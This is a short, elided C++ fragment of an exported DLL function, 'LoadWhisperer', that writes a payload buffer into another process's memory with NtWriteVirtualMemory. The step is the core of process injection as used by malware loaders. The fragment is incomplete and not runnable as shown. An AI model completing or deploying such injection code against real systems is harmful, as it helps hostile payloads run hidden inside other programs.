...
extern "C" {
	__declspec(dllexport) BOOL WINAPI LoadWhisperer(void) {
		...
		NtWriteVirtualMemory(hProcess, startAllocation, payload, sizeof(payload), 0);
